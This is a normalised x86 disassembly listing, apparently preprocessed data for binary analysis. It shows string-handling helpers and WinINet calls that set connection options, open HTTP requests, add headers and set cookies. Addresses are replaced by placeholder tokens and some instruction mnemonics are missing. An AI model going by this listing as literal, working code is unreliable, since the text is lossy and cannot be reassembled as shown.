push edx
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
mov ecx [ ebp - 0x40 ]
mov esi [ r--data ]
mov eax ecx
mov [ ebp - 0x4 ] 0x1
cmp esi eax
lea edi [ ebx + 0xfc ]
mov [ ebp + 0x8 ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ ebp - 0x44 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x40 ] eax
mov [ ecx + eax ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406b10
add esp 0x4
mov edx [ ebp + 0x8 ]
lea esi [ ebx + 0xec ]
push edx
call sub_406e72
add esp 0x4
mov ecx esi
mov edi eax
call sub_4032e0
cmp eax edi
jae r-xdata
lea edx [ ebp - 0x48 ]
cmp edi edx
jne r-xdata
mov eax esi
mov [ ebp + 0x8 ] eax
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_406b1b
test eax eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
cmp ecx eax
jae r-xdata
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
push 0x1
push eax
mov ecx edi
call sub_402e80
test al al
je r-xdata
cmp eax ecx
jne r-xdata
mov ecx edi
call sub_4030c0
mov eax [ edi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax edx
cmp eax esi
jae r-xdata
call sub_406d47
mov eax [ esi + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx esi
call sub_402cf0
jmp r-xdata
cmp al 0xff
je r-xdata
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov esi [ ebp - 0x44 ]
test esi esi
jne r-xdata
mov ecx [ ebp - 0x44 ]
test ecx ecx
jne r-xdata
test esi esi
jbe r-xdata
mov esi eax
push 0x1
mov ecx esi
call sub_402cf0
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx ebx
push eax
call sub_4026f0
mov edi [ ebp - 0x28 ]
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ ebx + 0x100 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x100 ]
mov [ ebx + 0x104 ] eax
add eax ecx
mov [ eax ] 0x0
mov esi r--data
cmp [ ecx - 0x1 ] 0xfe
jae r-xdata
mov ecx r--data
push 0x0
push 0x0
mov ecx edi
call sub_402d40
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ebp + 0x8 ]
add ecx edx
sub eax esi
push eax
lea edx [ esi + ecx ]
push edx
push ecx
call sub_407270
mov eax [ edi + 0x8 ]
add esp 0xc
sub eax esi
mov ecx edi
push 0x0
push eax
mov [ ebp + 0x8 ] eax
call sub_402e80
test al al
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] edi
mov [ eax + edi * 2 ] 0x0
lea edi [ eax + edi * 2 ]
sub ecx eax
mov [ ebp - 0x24 ] edi
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
test edi edi
jbe r-xdata
push edi
mov ecx esi
call sub_4032f0
dec al
push edi
mov [ ecx - 0x1 ] al
mov ecx esi
call sub_402cf0
jmp r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx edi
call sub_402ca0
mov eax [ ebp - 0x44 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
push eax
call sub_402e60
mov dx [ eax ]
mov [ ecx + eax ] dx
mov edx [ ebp - 0x24 ]
add eax 0x2
dec edx
mov [ ebp - 0x24 ] edx
jne r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x3c ]
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
mov [ eax - 0x1 ] cl
jmp r-xdata
mov eax r--data
sub_402340
mov eax [ esp + 0x4 ]
push esi
test eax eax
mov esi ecx
je r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x44 ]
push edi
mov edi [ InternetSetOptionW@IAT ]
lea eax [ esi + 0x5c ]
push 0x4
push eax
push 0x2
push ecx
call edi
mov eax [ esi + 0x44 ]
lea edx [ esi + 0x64 ]
push 0x4
push edx
push 0x6
push eax
call edi
mov edx [ esi + 0x44 ]
lea ecx [ esi + 0x60 ]
push 0x4
push ecx
push 0x5
push edx
call edi
pop edi
sub_402390
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push eax
push ecx
push edx
call [ InternetConnectA@IAT ]
retn 0xc
sub_4023c0
sub esp 0x8
mov eax [ esp + 0x18 ]
mov [ esp ] rw-data
cmp eax 0x4
mov al [ ecx + 0x40 ]
mov [ esp + 0x4 ] 0x0
jne r-xdata
neg al
sbb eax eax
and eax 0x200000
add eax 0x4400000
neg al
sbb eax eax
and eax 0x200000
add eax 0x4c00000
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push 0x0
push eax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x18 ]
push 0x0
push 0x0
push ecx
push edx
push eax
call [ HttpOpenRequestA@IAT ]
add esp 0x8
retn 0x10
sub_402450
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
mov eax r--data
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0xc ]
push 0x1000000
push ecx
push eax
push edx
call [ HttpAddRequestHeadersA@IAT ]
test esi esi
mov edi eax
je r-xdata
mov eax esi
mov eax edi
pop edi
pop esi
retn 0x14
mov al [ esi - 0x1 ]
test al al
je r-xdata
dec esi
push esi
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ esi - 0x1 ] al
mov eax edi
pop edi
pop esi
retn 0x14
sub_4024b0
mov eax [ ecx + 0x80 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x34 ]
test ecx ecx
jne r-xdata
mov eax r--data
push eax
push rw-data
push ecx
call [ InternetSetCookieA@IAT ]
retn 0x4
mov ecx r--data
sub_4024e0
sub esp 0x110
xor eax eax
push ebx
mov [ esp + 0x4 ] eax
push esi
mov ebx ecx
push edi
mov [ esp + 0x10 ] eax
mov ecx 0x40
lea edi [ esp + 0x19 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] al
mov [ esp + 0xc ] 0x3
[ edi ]
stosw [ edi ]
mov ecx [ ebx + 0x94 ]
stosb [ edi ]
mov eax [ ebx + 0x90 ]
test eax eax
jne r-xdata
mov edx ecx
mov esi eax
lea edi [ esp + 0x18 ]
push 0xc
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ ebx + 0x44 ]
and ecx 0x3
lea eax [ esp + 0x1c ]
[ edi ] [ esi ]
mov esi [ InternetSetOptionA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x26
push edx
mov [ esp + 0x20 ] eax
call esi
test eax eax
jne r-xdata
mov eax r--data
mov ecx [ ebx + 0xa4 ]
test ecx ecx
jbe r-xdata
call [ GetLastError@IAT ]
pop edi
mov [ ebx + 0x2c ] eax
pop esi
xor al al
pop ebx
add esp 0x110
retn 0x4
pop edi
pop esi
mov al 0x1
pop ebx
add esp 0x110
retn 0x4
mov eax [ ebx + 0xa0 ]
test eax eax
jne r-xdata
mov edx [ ebx + 0x44 ]
add ecx ecx
push ecx
push eax
push 0x2b
push edx
call esi
test eax eax
jne r-xdata
mov eax r--data
mov ecx [ ebx + 0xb4 ]
test ecx ecx
jbe r-xdata
call [ GetLastError@IAT ]
pop edi
mov [ ebx + 0x2c ] eax
pop esi
xor al al
pop ebx
add esp 0x110
retn 0x4
mov eax [ ebx + 0xb0 ]
test eax eax
jne r-xdata
mov edx [ ebx + 0x44 ]
add ecx ecx
push ecx
push eax
push 0x2c
push edx
call esi
test eax eax
jne r-xdata
mov eax r--data
call [ GetLastError@IAT ]
pop edi
mov [ ebx + 0x2c ] eax
pop esi
xor al al
pop ebx
add esp 0x110
retn 0x4
sub_402710
push ecx
mov al [ ecx + 0xfc ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
lea esi [ ecx + 0xfc ]
push edi
xor edi edi
mov [ ebp ] al
mov [ ebp + 0x4 ] edi
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] edi
mov eax [ esi + 0x8 ]
mov ecx [ r--data ]
mov ebx eax
mov [ esp + 0x10 ] edi
cmp ecx ebx
jae r-xdata
cmp ebp esi
jne r-xdata
mov ebx ecx
cmp ebx edi
jbe r-xdata
cmp ebx edi
mov esi ecx
jbe r-xdata
push 0x1
push ebx
mov ecx ebp
call sub_402e80
test al al
je r-xdata
cmp ebx eax
jne r-xdata
mov ecx ebp
call sub_4030c0
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax esi
jae r-xdata
call sub_406d47
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
mov esi [ esi + 0x4 ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
cmp esi edi
jbe r-xdata
mov esi eax
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
mov esi r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
call sub_4030c0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
mov ecx [ ebp + 0x4 ]
sub eax esi
add ebx ecx
push eax
lea edx [ ebx + esi ]
push edx
push ebx
call sub_407270
mov ebx [ ebp + 0x8 ]
add esp 0xc
sub ebx esi
mov ecx ebp
push edi
push ebx
call sub_402e80
test al al
je r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
mov eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
push ebx
mov ecx ebp
call sub_402e60
mov [ ebp + 0x4 ] eax
mov ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
mov eax r--data
sub_402840
push ebx
push ebp
push esi
mov esi [ r--data ]
push edi
mov edi [ esp + 0x14 ]
lea ebp [ ecx + 0x30 ]
mov eax [ edi + 0x8 ]
mov ebx eax
cmp esi ebx
jae r-xdata
cmp ebp edi
jne r-xdata
mov ebx esi
xor esi esi
cmp ebx esi
jbe r-xdata
cmp [ ebp + 0x8 ] ebx
jae r-xdata
push 0x1
push ebx
mov ecx ebp
call sub_402e80
test al al
je r-xdata
cmp ebx eax
jne r-xdata
mov ecx ebp
call sub_4030c0
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax esi
jae r-xdata
call sub_406d47
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn 0x4
mov edi [ edi + 0x4 ]
cmp edi esi
mov esi r--data
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax esi
jne r-xdata
test esi esi
jbe r-xdata
mov esi eax
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ecx + ebx ] 0x0
mov esi edi
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
call sub_4030c0
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn 0x4
mov ecx [ ebp + 0x4 ]
sub eax esi
add ebx ecx
push eax
lea edx [ ebx + esi ]
push edx
push ebx
call sub_407270
mov edi [ ebp + 0x8 ]
add esp 0xc
sub edi esi
mov ecx ebp
push 0x0
push edi
call sub_402e80
test al al
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax esi
je r-xdata
push edi
mov ecx ebp
call sub_402e60
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov eax [ edi + 0x4 ]
cmp eax esi
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov [ ebp + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
pop esi
mov [ eax - 0x1 ] cl
pop ebp
mov al 0x1
pop ebx
retn 0x4
mov eax r--data
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_402980
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_4029c0
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_402a00
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov ebp ecx
cmp [ edi + 0x8 ] esi
jae r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x1c ]
mov ebx eax
sub ebx esi
cmp ecx ebx
jae r-xdata
call sub_406d47
cmp ebp edi
jne r-xdata
mov ebx ecx
xor edx edx
cmp ebx edx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ r--data ]
add ebx esi
cmp eax ebx
jae r-xdata
mov ecx ebp
call sub_402fa0
cmp eax ebx
jae r-xdata
cmp ebx eax
jne r-xdata
mov ecx ebp
call sub_4030c0
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_406d47
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
call sub_406b1b
mov eax [ edi + 0x4 ]
cmp eax edx
jne r-xdata
test edi edi
jbe r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
mov edi esi
call sub_4030c0
mov eax [ ebp + 0x8 ]
cmp eax esi
jae r-xdata
mov ecx [ ebp + 0x4 ]
sub eax edi
add ecx ebx
push eax
lea edx [ ecx + edi ]
push edx
push ecx
call sub_407270
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
mov ecx ebp
push 0x0
push esi
call sub_402e80
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
cmp al 0xff
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax edx
je r-xdata
test edi edi
jbe r-xdata
mov edi eax
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] esi
mov [ esi + eax ] 0x0
push 0x1
mov ecx ebp
call sub_402ca0
cmp eax ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov eax [ edi + 0x4 ]
cmp eax edx
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ ebp + 0x4 ]
sub eax edi
push eax
lea edx [ ecx + edi ]
push edx
push ecx
call sub_407270
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
mov ecx ebp
push 0x0
push esi
call sub_402e80
test al al
je r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
add esi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
mov eax r--data
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push ebx
mov ecx ebp
call sub_402fb0
dec al
push ebx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_402ca0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov [ ebp + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov eax r--data
push ecx
call sub_406b10
add esp 0x4
xor edx edx
cmp al 0xff
je r-xdata
push esi
mov ecx ebp
call sub_402e60
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
dec al
mov [ ecx ] al
jmp r-xdata
sub_402c00
push ebx
mov ebx [ esp + 0xc ]
push ebp
cmp ebx 0xfffffffd
mov ebp ecx
jbe r-xdata
mov ecx [ ebp + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
call sub_406b1b
cmp ebx edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
mov eax ebp
pop ebp
pop ebx
retn 0x8
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
cmp eax ebx
jae r-xdata
cmp ebx edx
jne r-xdata
mov ecx ebx
push esi
mov esi [ esp + 0x10 ]
mov eax ecx
push edi
mov edi [ ebp + 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
pop edi
mov [ ebp + 0x8 ] ebx
pop esi
mov [ ebx + ecx ] 0x0
pop ebp
pop ebx
retn 0x8
push ebx
mov ecx ebp
call sub_402fb0
dec al
mov [ ecx - 0x1 ] al
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov eax ebp
pop ebp
pop ebx
retn 0x8
sub_402ca0
mov al [ esp + 0x4 ]
push esi
test al al
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_402cf0
mov al [ esp + 0x4 ]
push esi
test al al
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_402d40
push ebx
push ebp
mov ebp ecx
push esi
mov ecx [ esp + 0x10 ]
push edi
mov eax [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
mov esi [ ebp + 0x4 ]
xor ebx ebx
cmp esi ebx
je r-xdata
call sub_406d47
mov eax [ ebp + 0x8 ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
sub eax edx
cmp eax edi
jae r-xdata
mov al [ esi - 0x1 ]
test al al
je r-xdata
cmp edi ebx
jbe r-xdata
mov edi eax
cmp al 0xff
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx [ ebp + 0x4 ]
mov edx [ esp + 0x14 ]
add ecx edx
sub eax edi
push eax
lea eax [ ecx + edi ]
push eax
push ecx
call sub_407270
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
cmp esi 0xfffffffd
jbe r-xdata
dec al
mov edi esi
mov [ esi - 0x1 ] al
or ecx 0xffffffff
xor eax eax
mov [ ebp + 0x4 ] ebx
mov [ ebp + 0x8 ] ebx
mov [ ebp + 0xc ] ebx
[ edi ]
not ecx
dec ecx
push 0x1
mov ebx ecx
mov ecx ebp
push ebx
call sub_402e80
test al al
je r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx ebx
je r-xdata
call sub_406b1b
xor ebx ebx
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov edx ecx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
call sub_402e60
cmp esi ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
cmp ecx ebx
je r-xdata
cmp al 0xff
je r-xdata
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] esi
mov [ esi + ecx ] 0x0
push esi
mov ecx ebp
call sub_402fb0
pop edi
mov [ ebp + 0x8 ] ebx
mov eax ebp
pop esi
pop ebp
mov [ ecx ] 0x0
pop ebx
retn 0x8
cmp esi ebx
jne r-xdata
dec al
push ebx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_402ca0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x8
sub_402e80
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp edi 0xfffffffd
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call sub_406b1b
mov cl [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0x1f
ja r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
push edi
mov ecx esi
call sub_402fb0
cmp eax ebx
je r-xdata
cmp ecx edi
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov [ esi + 0x8 ] ebx
mov [ eax ] bl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop edi
pop esi
xor al al
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_402fb0
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
pop edi
mov [ ecx ] al
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
dec al
push edi
mov [ ecx ] al
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_402fb0
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
sub_402fb0
push ebp
mov ebp esp
push 0xffffffff
push sub_40df30
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
or esi 0x1f
push edi
mov ebx ecx
cmp esi 0xfffffffd
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ esi + 0x2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jge r-xdata
mov [ ebp - 0x14 ] eax
mov esi eax
push eax
call sub_4075a5
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov eax [ ebx + 0x8 ]
test eax eax
jbe r-xdata
mov eax [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] 0x0
inc eax
cmp edi esi
mov [ ebx + 0x4 ] eax
mov [ eax - 0x1 ] 0x0
mov [ ebx + 0xc ] esi
ja r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx ecx
shr ecx 0x2
lea edi [ eax + 0x1 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x14 ]
mov eax esi
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] esi
pop edi
mov [ ecx + esi ] 0x0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi edi
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_4030c0
push ebx
push ebp
mov ebp ecx
xor edx edx
push esi
push edi
mov ecx [ ebp + 0x4 ]
cmp ecx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp al 0xff
je r-xdata
dec al
mov esi ecx
mov [ ecx - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0xfffffffd
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx edx
je r-xdata
call sub_406b1b
xor edx edx
cmp ebx edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
pop edi
pop esi
pop ebp
pop ebx
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
cmp eax ebx
jae r-xdata
cmp ebx edx
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
push ebx
mov ecx ebp
call sub_402fb0
dec al
push edx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_402ca0
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4031b0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x7ffffffd
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call sub_406b1b
mov cl [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0x1f
ja r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
push edi
mov ecx esi
call sub_4032f0
cmp eax ebx
je r-xdata
cmp ecx edi
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov [ esi + 0x8 ] ebx
mov [ eax ] bx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
dec cl
pop edi
